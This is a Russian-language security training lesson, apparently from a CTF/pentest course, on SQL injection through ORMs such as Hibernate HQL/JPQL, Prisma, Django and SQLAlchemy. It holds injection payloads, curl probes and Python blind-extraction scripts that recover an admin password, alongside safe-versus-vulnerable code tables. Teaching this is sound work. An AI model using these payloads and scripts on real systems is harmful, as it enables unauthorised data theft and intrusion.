---
id: web-orm-injection
title: "ORM/HQL/JPQL-инъекции: SQL за абстракцией"
category: web
parent: web-injection-advanced
difficulty: hard
order: 2
tags: [orm, hql, jpql, hibernate, prisma, sqli]
prerequisites: [web-sqli]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "SQL-инъекции в ORM: HQL/JPQL, сырые фрагменты, Hibernate, Prisma raw, обход подготовленных выражений."
---

ORM (Hibernate, JPA, Prisma, Django ORM, SQLAlchemy, ActiveRecord) абстрагирует SQL, но **не отменяет инъекцию**. Опасность возникает там, где в ORM-запрос попадает пользовательский ввод через строковую конкатенацию: `createQuery("FROM User WHERE name='" + name + "'")`, `ORDER BY ${col}`, raw-запросы, `extra()`, `RawSQL`. Тогда инъекция идёт на языке ORM (HQL/JPQL) или напрямую в SQL, а обход «защиты ORM» оказывается не сложнее обычной SQLi.

## Теория: где ORM течёт

| Причина утечки | Пример | Результат |
|----------------|--------|-----------|
| Конкатенация в HQL/JPQL | `"... WHERE name='"+n+"'"` | HQLi |
| Динамический ORDER BY | `"order by "+col` | инъекция колонки |
| `Query.setString` vs конкатенация | `"x"+val` | SQLi |
| Raw-запросы | `session.createSQLQuery(...)` | SQLi |
| Django `extra()`/`RawSQL`/`cursor.execute(f"...")` | f-string | SQLi |
| SQLAlchemy `text("..."+v)` | конкатенация | SQLi |
| Prisma `$queryRawUnsafe` | шаблон | SQLi |

Параметризованные запросы (`:name`, `?`, `%s`, ORM-методы `filter(name=x)`) — безопасны. Течёт именно **строковая сборка**.

## HQL/JPQL: особенности

HQL/JPQL работают с **сущностями и полями**, не с таблицами:

```hql
FROM User u WHERE u.username = 'admin' AND u.password = 'x'
```

Инъекция: `admin' or '1'='1`, `admin' or 1=1 or ''='`. Разница с SQL: нет `UNION SELECT` по таблицам — только по сущностям (`... or 1=1`). Blind-функции: в JPQL нет `SLEEP`; в Hibernate можно вызвать `CURRENT_TIMESTAMP`/подзапросы, а для тайминга — тяжёлые подзапросы.

Полезные HQL-приёмы:

```hql
' or '1'='1
' or 1=1 --
' or (SELECT COUNT(*) FROM User)>0 --
' or substring(u.password,1,1)='a' --
```

(Комментарий `--` работает не всегда — подбирайте баланс.)

## ORDER BY и динамические колонки

`ORDER BY ${sort}` — классическая точка. Если сортировка подставляется строкой:

```text
?sort=name
?sort=(CASE WHEN (1=1) THEN name ELSE email END)
?sort=name,(SELECT ...)
```

Blind через CASE:

```sql
ORDER BY (CASE WHEN substring(password,1,1)='a' THEN name ELSE email END)
```

Разный порядок строк = oracle.

## Разобранный пример: HQL boolean-слепое извлечение

Цель: `GET /api/users?q=admin` → HQL `FROM User WHERE username LIKE '%admin%'`.

Шаг 1 — проверка:

```bash
curl -s 'https://app.example/api/users?q=admin%27'
# ошибка Hibernate/500 -> инъекция
```

Шаг 2 — blind oracle:

```bash
curl -s "https://app.example/api/users?q=x' or substring(password,1,1)='a' or '1'='2"
```

Шаг 3 — скрипт подбора:

```python
import requests, string
def oracle(cond):
    r = requests.get("https://app.example/api/users", params={"q": f"x' or {cond} or '1'='2"})
    return "admin" in r.text
pw=""
for i in range(1,50):
    for c in string.printable:
        if oracle(f"substring(password,{i},1)='{c}'"):
            pw+=c; break
print(pw)
```

## Prisma / Node ORM

Prisma безопасен при `findMany({where:{name: x}})`, но `$queryRawUnsafe` и `$executeRawUnsafe` с шаблонной строкой — инъекция:

```js
await prisma.$queryRawUnsafe(`SELECT * FROM "User" WHERE name = '${name}'`);
```

Инъекция: `' OR '1'='1`. Sequelize `sequelize.query("... "+v)` — то же. Knex `whereRaw("name = '"+v+"'")` — то же.

## Django ORM / SQLAlchemy

Django безопасен при `User.objects.filter(name=x)`, но `extra(where=["name='%s'" % x])`, `RawSQL`, `cursor.execute(f"SELECT ... '{x}'")` — инъекция. SQLAlchemy безопасен с `text("... :n").bindparams(n=x)`, но `text("... '"+v+"'")` — инъекция.

```python
# уязвимо
cursor.execute("SELECT * FROM users WHERE name = '%s'" % name)
# безопасно
cursor.execute("SELECT * FROM users WHERE name = %s", [name])
```

## Обнаружение

- Ошибки: `org.hibernate.QueryException`, `JPQL`, `SQLAlchemy`, `psycopg2`, `PrismaClientKnownRequestError`, `SequelizeDatabaseError`.
- Параметры `sort=`, `order=`, `filter=`, `q=`, `where=`, `search=`.
- Наличие ORM в стеке (по заголовкам/структуре, `X-Powered-By`, `Server`).
- Сравнение поведения: `?q=admin'` → 500, `?q=admin''` → 200.

## Инструменты

- **`sqlmap`** (`-r request.txt`) — работает и по ORM-параметрам, часто через `--dbms` (см. `web-tool-sqlmap`).
- **Burp Repeater/Intruder** — blind-подбор.
- **`ffuf`** — поиск параметров.
- **Исходники** — ищите конкатенацию в HQL/raw/`extra()`/`$queryRawUnsafe`.

## Что дальше / decision

1. Параметр в `sort/order/filter` → проверьте `'` и `CASE`.
2. Ошибка ORM → определите язык (HQL/JPQL/SQL).
3. Вывод виден → union по сущностям/полям; иначе blind `substring`.
4. ORM-специфика (нет SLEEP) → тайминг через тяжёлые подзапросы.
5. Дальше — эскалация к RCE через DB-функции (см. `db-mysql`, `db-postgresql`).

## Частые ошибки

- **Верить, что «ORM = безопасно».** Течёт строковая сборка, а не ORM.
- **Путать HQL и SQL.** Нет `UNION SELECT table` — только сущности.
- **Ждать `SLEEP`.** В JPQL его нет; используйте подзапросы.
- **Игнорировать ORDER BY.** Динамическая колонка — частая точка.
- **Сдаваться на ошибке 500.** Это признак инъекции, а не тупик.
- **Ломать прод.** Только с согласия.

## Полный разбор: JPQL blind extraction через CASE (с выводом)

JPQL не имеет `SLEEP`, поэтому тайминг строится иначе, а boolean-oracle — самый надёжный путь. Цель — `GET /api/users?q=admin` строит `FROM User WHERE username LIKE '%admin%'`.

Шаг 1. Подтверждаем инъекцию по ошибке/разнице:

```bash
curl -s 'https://app.example/api/users?q=admin%27' | head -c 120
# {"error":"could not extract ResultSet"}  -> JPQL/парсер упал
curl -s 'https://app.example/api/users?q=admin%27%27' -o /dev/null -w '%{http_code}\n'
# 200  -> кавычки балансируются: инъекция подтверждена
```

Шаг 2. Определяем oracle — отличаем «истину» от «лжи»:

```bash
# истина: возвращает список
curl -s "https://app.example/api/users?q=x%27%20or%201%3D1%20or%20%271%27%3D%272"
# [{"id":1,"username":"admin"},...]

# ложь: пусто
curl -s "https://app.example/api/users?q=x%27%20or%201%3D2%20or%20%271%27%3D%272"
# []
```

Шаг 3. Извлекаем длину пароля админа:

```bash
for n in $(seq 1 40); do
  r=$(curl -s "https://app.example/api/users?q=x'%20or%20length(u.password)=$n%20or%20'1'='2")
  echo "$r" | grep -q admin && { echo "len=$n"; break; }
done
# len=32
```

Шаг 4. Посимвольно:

```python
import requests, string
URL="https://app.example/api/users"
def oracle(cond):
    r=requests.get(URL, params={"q": f"x' or {cond} or '1'='2"})
    return "admin" in r.text
pw=""
for i in range(1,40):
    for c in string.ascii_lowercase+string.digits+"{}_!":
        if oracle(f"substring(u.password,{i},1)='{c}'"):
            pw+=c; break
print("password:", pw)
```

Шаг 5. Далее — фиксируем креды и пробуем вход/эскалацию. Аналогично извлекаются другие поля сущности (`u.email`, `u.role`).

## Reference-таблица: ORM/фреймворк — уязвимый вызов — безопасный

| Стек | Уязвимо (конкатенация) | Безопасно (параметры) |
|------|------------------------|-----------------------|
| Hibernate HQL | `createQuery("...'"+v+"'")` | `setParameter("p", v)` |
| JPA JPQL | `"... order by "+col` | whitelist колонок |
| Django | `extra(where=[...%v])`, `RawSQL`, f-string в `execute` | `filter(name=v)` |
| SQLAlchemy | `text("...'"+v+"'")` | `text("...:p").bindparams(p=v)` |
| Sequelize | `sequelize.query("...'"+v+"'")` | `replacements`/`bind` |
| Prisma | `$queryRawUnsafe(\`...${v}\`)` | `$queryRaw\`...\`` (tagged) |
| Knex | `whereRaw("name='"+v+"'")` | `where({name:v})` |
| TypeORM | `query("...'"+v+"'")` | параметры `$1` |
| ActiveRecord | `where("name='#{v}'")` | `where(name: v)` |
| Mongoose | `$where` со строкой | типизация входа |

Правило: **любая строковая сборка запроса с пользовательским вводом — уязвима**, независимо от ORM.

## Обход ORM-специфики: ORDER BY, LIKE, пагинация

- **ORDER BY** (`?sort=name`): колонку нельзя биндить → инъекция. Payload: `name,(CASE WHEN (SELECT ...) THEN 1 ELSE 2 END)`; для boolean — `(CASE WHEN substring(...)='a' THEN name ELSE id END)`.
- **LIKE** (`?q=%admin%`): если `%` склеивается, добавляйте свои `%`/`_` и подзапросы: `%' or 1=1 --`.
- **LIMIT/OFFSET** (`?limit=`): иногда конкатенируется; `1 union select ...` (для raw) или `1; ...`.
- **Динамические фильтры:** `?filter[role]=admin` — mass assignment + инъекция в значения.
- **JPA Criteria:** безопасен, если используются `CriteriaBuilder`/`Predicate`; течёт при `cb.literal`/строках.

## Что делать дальше / решение

1. **Найти параметры** `sort/order/filter/q/search/where` и подставить `'`.
2. **По ошибке определить язык** (HQL/JPQL/SQL/ORM-сообщение).
3. **Построить oracle** (boolean/разница/ошибка), затем blind-извлечение через `substring`.
4. **ORDER BY** — тестировать `CASE`-инъекцию для blind.
5. **Не ждать `SLEEP`** в JPQL — использовать boolean/тяжёлые подзапросы.
6. **Эскалировать** к чтению секретов (пароли, токены), затем — к RCE через DB-функции при наличии прав.
7. **Записать артефакт** (скрипт-оракул) и креды.

## Практические инструменты и автоматизация ORM-инъекций

- **sqlmap по сохранённому запросу:** `sqlmap -r request.txt -p sort --batch --level 3 --risk 2 --dbms=mysql`. Для HQL/JPQL sqlmap может не распознать синтаксис — тогда работайте вручную и используйте `--technique=B` (boolean).
- **Burp Intruder:** перебор `substring(...)` по символам; grep-match по признаку «есть результат».
- **`ffuf`:** находит параметры (`sort`, `order`, `filter`) через словарь `burp-parameter-names.txt`.
- **Анализ исходников:** ищите `createQuery`, `createNativeQuery`, `$queryRawUnsafe`, `extra(`, `RawSQL`, `text(` рядом с конкатенацией. Это самая быстрая точка входа при code review.
- **Логи ошибок:** `org.hibernate.*`, `org.eclipse.persistence.*`, `django.db.utils`, `psycopg2.errors`, `PrismaClient*` — подтверждают ORM и язык.

Практика: ORM-инъекции почти всегда blind, поэтому заранее напишите параметризованный скрипт-оракул и переиспользуйте его для разных полей и сущностей. Это экономит десятки ручных запросов и снижает нагрузку на цель.

## Пример на SQLAlchemy (Python)

```python
# уязвимо: конкатенация строки
q = "SELECT * FROM users WHERE name = '" + name + "'"
db.session.execute(text(q))

# безопасно: bind-параметр
db.session.execute(text("SELECT * FROM users WHERE name = :n"), {"n": name})

# уязвимо: order by из ввода
db.session.execute(text(f"SELECT * FROM users ORDER BY {col}"))
```

Инъекция: `?name=' OR '1'='1` → возвращает всех; `?col=(CASE WHEN 1=1 THEN id ELSE name END)` → blind-сортировка. При code review ищите f-строки и `%`/`+` рядом с `text(`, `execute(`, `from_statement(`. Безопасная альтернатива для `ORDER BY` — whitelist допустимых колонок.

## Квиз

```quiz
- question: "Когда ORM не защищает от SQLi?"
  options:
    - "Всегда защищает"
    - "Когда запрос строится конкатенацией, а не параметрами"
    - "Только в MySQL"
    - "Никогда"
  answer: 1
  explanation: "Параметризация — единственная защита."
- question: "Почему ORDER BY часто уязвим?"
  options:
    - "Он медленный"
    - "Колонку нельзя биндить параметром, приходится конкатенировать"
    - "Он шифрует"
    - "Он кешируется"
  answer: 1
  explanation: "Имя колонки — часть SQL, не значение."
- question: "Чем HQL отличается от SQL?"
  options:
    - "Ничем"
    - "Оперирует сущностями/полями, свой синтаксис"
    - "Он быстрее"
    - "Он без SELECT"
  answer: 1
  explanation: "HQL/JPQL — над ORM-моделью."
- question: "Какая функция Prisma небезопасна при конкатенации?"
  options:
    - "$queryRaw с тегами"
    - "$queryRawUnsafe"
    - "findMany"
    - "count"
  answer: 1
  explanation: "$queryRawUnsafe подставляет строку как есть."
- question: "Как извлечь данные, если нет ошибок?"
  options:
    - "Никак"
    - "Boolean/тайминг-слепым брутом"
    - "Сменить браузер"
    - "Увеличить таймаут"
  answer: 1
  explanation: "Бинарный/временной оракул."
```

## Где пригодится

- **CTF (Web):** задачи с Hibernate/JPA.
- **Bug bounty:** SQLi за ORM — частый пропущенный баг.
- **Пентест:** аудит Java/Node приложений с ORM.
- **Работа (AppSec):** code review на конкатенацию в createQuery/orderBy/raw.
